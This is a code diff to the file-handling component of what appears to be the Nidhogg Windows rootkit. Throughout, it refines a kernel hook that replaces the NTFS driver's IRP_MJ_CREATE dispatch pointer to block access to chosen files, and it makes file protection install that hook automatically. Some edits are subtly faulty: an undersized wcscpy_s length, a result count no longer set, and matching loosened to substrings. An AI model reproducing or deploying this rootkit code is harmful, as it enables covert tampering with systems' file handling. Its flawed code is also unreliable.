@@ -5,7 +5,7 @@ _IRQL_requires_max_(APC_LEVEL)
 FileHandler::FileHandler() {
 	if (!InitializeList(&protectedFiles))
 		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);
-	memset(this->Callbacks, 0, sizeof(this->Callbacks));
+	memset(callbacks, 0, sizeof(callbacks));
 }
 
 _IRQL_requires_max_(APC_LEVEL)
@@ -15,7 +15,7 @@ FileHandler::~FileHandler() {
 
 	// Uninstalling NTFS hooks if there are any.
 	for (int i = 0; i < SUPPORTED_HOOKED_NTFS_CALLBACKS; i++) {
-		if (this->Callbacks[i].Activated) {
+		if (callbacks[i].Activated) {
 			UninstallNtfsHook(i);
 		}
 	}
@@ -28,7 +28,7 @@ _IRQL_requires_max_(APC_LEVEL)
 PVOID FileHandler::GetNtfsCallback(_In_ ULONG index) const {
 	if (index >= SUPPORTED_HOOKED_NTFS_CALLBACKS)
 		ExRaiseStatus(STATUS_INVALID_PARAMETER);
-	return this->Callbacks[index].Address;
+	return callbacks[index].Address;
 }
 
 /*
@@ -46,11 +46,16 @@ _IRQL_requires_max_(DISPATCH_LEVEL)
 _IRQL_requires_same_
 NTSTATUS HookedNtfsIrpCreate(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp) {
 	auto stack = IoGetCurrentIrpStackLocation(Irp);
-	UNICODE_STRING fullPath = {0};
-	KIRQL lockIrql = 0;
-	KIRQL prevIrql = 0;
+	UNICODE_STRING fullPath = { 0 };
+	KIRQL prevIrql = PASSIVE_LEVEL;
 	tNtfsIrpFunction originalFunction = nullptr;
 	NTSTATUS status = STATUS_SUCCESS;
+	IrqlGuard irqlGuard = IrqlGuard();
+
+	auto ReleaseLock = [&]() {
+		irqlGuard.SetIrql(DISPATCH_LEVEL);
+		KeReleaseSpinLock(&stack->FileObject->IrpListLock, prevIrql);
+	};
 
 	// If we reach here, it means something went horribly wrong.
 	__try {
@@ -68,27 +73,29 @@ NTSTATUS HookedNtfsIrpCreate(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP I
 		if (stack->FileObject->FileName.Length == 0 || !stack->FileObject->FileName.Buffer)
 			break;
 
-		// Validating the address of the file name.
-		status = ProbeAddress(stack->FileObject->FileName.Buffer, stack->FileObject->FileName.Length, sizeof(WCHAR*));
-
-		if (!NT_SUCCESS(status))
-			break;
-
 		// Acquiring the lock to prevent accessing to the file from other drivers.
 		KeAcquireSpinLock(&stack->FileObject->IrpListLock, &prevIrql);
-		KeLowerIrql(lockIrql);
+		fullPath.Length = stack->FileObject->FileName.Length;
+		fullPath.MaximumLength = stack->FileObject->FileName.MaximumLength;
+		fullPath.Buffer = AllocateMemory<WCHAR*>(static_cast<SIZE_T>(fullPath.MaximumLength), false);
 
-		status = CopyUnicodeString(PsGetCurrentProcess(), &stack->FileObject->FileName, PsGetCurrentProcess(), &fullPath, 
-			KernelMode);
-
-		if (!NT_SUCCESS(status) || !fullPath.Buffer)
+		if (!fullPath.Buffer) {
+			ReleaseLock();
 			break;
+		}
 
-		KeRaiseIrql(DISPATCH_LEVEL, &prevIrql);
-		KeReleaseSpinLock(&stack->FileObject->IrpListLock, prevIrql);
-		KeLowerIrql(prevIrql);
+		__try {
+			RtlCopyUnicodeString(&fullPath, &stack->FileObject->FileName);
+		}
+		__except (EXCEPTION_EXECUTE_HANDLER) {
+			ReleaseLock();
+			break;
+		}
 
-		if (NidhoggFileHandler->FindFile(fullPath.Buffer, FileType::Protected)) {
+		ReleaseLock();
+		irqlGuard.SetIrql(PASSIVE_LEVEL);
+
+		if (NidhoggFileHandler->FindFile(fullPath.Buffer, FileType::Protected, false)) {
 			FreeVirtualMemory(fullPath.Buffer);
 			Irp->IoStatus.Status = STATUS_ACCESS_DENIED;
 			return STATUS_SUCCESS;
@@ -96,6 +103,7 @@ NTSTATUS HookedNtfsIrpCreate(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP I
 	} while (false);
 	FreeVirtualMemory(fullPath.Buffer);
 
+	irqlGuard.UnsetIrql();
 	return originalFunction(DeviceObject, Irp);
 }
 
@@ -115,6 +123,9 @@ NTSTATUS FileHandler::InstallNtfsHook(_In_ ULONG irpMjFunction) {
 	PDRIVER_OBJECT ntfsDriverObject = nullptr;
 	LONG64 functionAddress = 0;
 	NTSTATUS status = STATUS_SUCCESS;
+
+	if (callbacks[irpMjFunction].Activated)
+		return STATUS_ABANDONED;
 
 	RtlInitUnicodeString(&ntfsName, NTFS_DRIVER_PATH);
 	status = ObReferenceObjectByName(&ntfsName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, 
@@ -136,10 +147,10 @@ NTSTATUS FileHandler::InstallNtfsHook(_In_ ULONG irpMjFunction) {
 		return status;
 	}
 
-	this->Callbacks[irpMjFunction].Address = reinterpret_cast<PVOID>(InterlockedExchange64(
+	callbacks[irpMjFunction].Address = reinterpret_cast<PVOID>(InterlockedExchange64(
 		reinterpret_cast<LONG64*>(&ntfsDriverObject->MajorFunction[irpMjFunction]),
 		functionAddress));
-	this->Callbacks[irpMjFunction].Activated = true;
+	callbacks[irpMjFunction].Activated = true;
 
 	ObDereferenceObject(ntfsDriverObject);
 	return status;
@@ -162,6 +173,9 @@ NTSTATUS FileHandler::UninstallNtfsHook(_In_ ULONG irpMjFunction) {
 	LONG64 functionAddress = 0;
 	NTSTATUS status = STATUS_SUCCESS;
 
+	if (!callbacks[irpMjFunction].Activated)
+		return STATUS_ABANDONED;
+
 	RtlInitUnicodeString(&ntfsName, NTFS_DRIVER_PATH);
 
 	status = ObReferenceObjectByName(&ntfsName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, 
@@ -172,7 +186,7 @@ NTSTATUS FileHandler::UninstallNtfsHook(_In_ ULONG irpMjFunction) {
 
 	switch (irpMjFunction) {
 		case IRP_MJ_CREATE: {
-			functionAddress = reinterpret_cast<LONG64>(this->Callbacks[IRP_MJ_CREATE].Address);
+			functionAddress = reinterpret_cast<LONG64>(this->callbacks[IRP_MJ_CREATE].Address);
 			break;
 		}
 		default:
@@ -184,8 +198,8 @@ NTSTATUS FileHandler::UninstallNtfsHook(_In_ ULONG irpMjFunction) {
 		return status;
 	}
 	InterlockedExchange64(reinterpret_cast<LONG64*>(&ntfsDriverObject->MajorFunction[irpMjFunction]), functionAddress);
-	this->Callbacks[irpMjFunction].Address = nullptr;
-	this->Callbacks[irpMjFunction].Activated = false;
+	this->callbacks[irpMjFunction].Address = nullptr;
+	this->callbacks[irpMjFunction].Activated = false;
 
 	ObDereferenceObject(ntfsDriverObject);
 	return status;
@@ -199,23 +213,26 @@ NTSTATUS FileHandler::UninstallNtfsHook(_In_ ULONG irpMjFunction) {
 * Parameters:
 * @path   [_In_ WCHAR*]   -- File's path.
 * @type   [_In_ FileType] -- Type of file to search (Protected or Hidden).
+* @exact  [_In_ bool]	  -- Whether to search for an exact match or not.
 *
 * Returns:
 * @bool					  -- Whether the file was found or not.
 */
-_IRQL_requires_max_(DISPATCH_LEVEL)
-bool FileHandler::FindFile(_In_ WCHAR* path, _In_ FileType type) const {
+_IRQL_requires_max_(APC_LEVEL)
+bool FileHandler::FindFile(_In_ WCHAR* path, _In_ FileType type, _In_ bool exact) const {
 	if (!IsValidPath(path))
 		return false;
+	SearchedFile searchedFile = { path, exact };
 
+	auto finder = [](_In_ const FileItem* entry, _In_ SearchedFile searchedFile) -> bool {
+		if (!searchedFile.Exact) [[ likely ]]
+			return wcsstr(entry->FilePath, searchedFile.Path);
+		return _wcsicmp(entry->FilePath, searchedFile.Path) == 0;
+	};
 	switch (type) {
 	case FileType::Protected: {
-		auto finder = [](_In_ const FileItem* entry, _In_ wchar_t* path) -> bool {
-			return _wcsicmp(entry->FilePath, path) == 0;
-		};
-
-		return FindListEntry<FilesList, FileItem, wchar_t*>(
-			this->protectedFiles, path, finder
+		return FindListEntry<FilesList, FileItem, SearchedFile>(
+			this->protectedFiles, searchedFile, finder
 		);
 		break;
 	}
@@ -237,7 +254,9 @@ bool FileHandler::FindFile(_In_ WCHAR* path, _In_ FileType type) const {
 */
 _IRQL_requires_max_(APC_LEVEL)
 bool FileHandler::ProtectFile(_In_ WCHAR* path) {
-	if (!IsValidPath(path) || !IsFileExists(path))
+	IrqlGuard guard(PASSIVE_LEVEL);
+
+	if (!IsFileExists(path))
 		return false;
 
 	if (FindFile(path, FileType::Protected))
@@ -253,7 +272,13 @@ bool FileHandler::ProtectFile(_In_ WCHAR* path) {
 		return false;
 	}
 	AddEntry<FilesList, FileItem>(&protectedFiles, newEntry);
-	return false;
+	NTSTATUS status = InstallNtfsHook(IRP_MJ_CREATE);
+
+	if (!NT_SUCCESS(status) && status != STATUS_ABANDONED) {
+		RemoveListEntry<FilesList, FileItem>(&protectedFiles, newEntry);
+		return false;
+	}
+	return true;
 }
 
 /*
@@ -315,17 +340,17 @@ void FileHandler::ClearFilesList(_In_ FileType type) {
 * QueryFiles is responsible for getting a protected file.
 *
 * Parameters:
-* @item   [FileItem*] -- Protected file to get.
+* @filesList [_Inout_ IoctlFileList*] -- Protected file to get.
 *
 * Returns:
-* @status [NTSTATUS]  -- Whether successfully copied or not.
+* @bool								  -- Whether successfully copied or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
-NTSTATUS FileHandler::ListProtectedFiles(_Inout_ IoctlFileList* filesList) {
+bool FileHandler::ListProtectedFiles(_Inout_ IoctlFileList* filesList) {
 	PLIST_ENTRY currentEntry = nullptr;
-	SIZE_T count = 0;
-	NTSTATUS status = STATUS_SUCCESS;
-
+	SIZE_T index = 0;
+	FileItem* item = nullptr;
+	errno_t err = 0;
 	AutoLock locker(protectedFiles.Lock);
 
 	if (protectedFiles.Count == 0) {
@@ -342,30 +367,18 @@ NTSTATUS FileHandler::ListProtectedFiles(_Inout_ IoctlFileList* filesList) {
 	if (!guard.IsValid())
 		return false;
 
-	while (currentEntry->Flink != protectedFiles.Items && count < protectedFiles.Count) {
+	while (currentEntry->Flink != protectedFiles.Items && index < protectedFiles.Count) {
 		currentEntry = currentEntry->Flink;
-		FileItem* item = CONTAINING_RECORD(currentEntry, FileItem, Entry);
+		item = CONTAINING_RECORD(currentEntry, FileItem, Entry);
 
 		if (item) {
-			status = MmCopyVirtualMemory(
-				PsGetCurrentProcess(),
-				&item->FilePath,
-				PsGetCurrentProcess(),
-				&filesList->Files[count],
-				wcslen(item->FilePath) * sizeof(WCHAR),
-				UserMode,
-				nullptr
-			);
+			err = wcscpy_s(filesList->Files[index], wcslen(item->FilePath), item->FilePath);
 
-			if (!NT_SUCCESS(status)) {
-				filesList->Count = count;
+			if (err != 0)
 				return false;
-			}
 		}
-		count++;
+		index++;
 		currentEntry = currentEntry->Flink;
 	}
-
-	filesList->Count = count;
 	return true;
 }
